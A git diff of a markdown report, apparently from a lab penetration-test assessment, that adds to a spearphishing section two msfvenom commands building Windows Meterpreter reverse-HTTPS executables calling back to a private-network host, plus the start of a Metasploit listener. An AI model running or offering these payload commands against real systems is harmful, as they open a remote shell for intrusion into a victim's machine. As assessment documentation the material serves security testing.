@@ -52,12 +52,13 @@ The assessment identified a critical misconfiguration in the local security poli
 **Vector:** Spearphishing Attachment (VBA Macro)
 **Premise:** A malicious PDF disguised as an invoice was delivered to the target user.
 
+<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />
+
 **Commands Used:**
 ```bash
 # Payload Generation
-
-<img width="865" height="152" alt="image" src="https://github.com/user-attachments/assets/d1111b21-a0cd-4578-ba1d-11f76c2b2ebb" />
-
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe   #Payload for option b, port selection assumes previous payload was ended
 
 # Listener Setup
 use exploit/multi/handler
